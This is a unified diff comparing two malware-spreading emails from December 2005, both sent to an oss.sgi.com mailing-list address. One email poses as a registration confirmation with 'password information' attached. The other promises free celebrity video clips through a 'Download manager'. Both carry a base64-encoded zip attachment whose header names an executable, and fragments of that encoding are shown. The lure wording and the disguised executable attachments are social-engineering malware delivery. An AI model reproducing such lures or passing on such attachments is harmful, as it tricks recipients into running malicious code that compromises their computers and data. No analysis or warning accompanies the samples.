@@ -1,29 +1,30 @@
-From: office@vasara.co.jp.sgi.com
-Subject: Registration Confirmation
-Date: Wed, 21 Dec 2005 02:03:05 GMT
-Message-ID: <c423fab7faa358eb@vasara.co.jp>
+From: office@dokom.net
+Subject: Paris Hilton & Nicole Richie
+Date: Wed, 21 Dec 2005 01:06:34 UTC
+Message-ID: <4130491a5e.2893a5f8@dokom.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====845dfddcea0ce8b3a9a27f"
+Content-Type: multipart/mixed; boundary="==c4ccd35cfda7"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: emailserv@oss.sgi.com
+To: ralf@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====845dfddcea0ce8b3a9a27f
+--==c4ccd35cfda7
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.vasara.co.jp
-***** Email: postman@vasara.co.jp
---====845dfddcea0ce8b3a9a27f
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+Please use our Download manager.
+--==c4ccd35cfda7
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====845dfddcea0ce8b3a9a27f--
+--==c4ccd35cfda7--
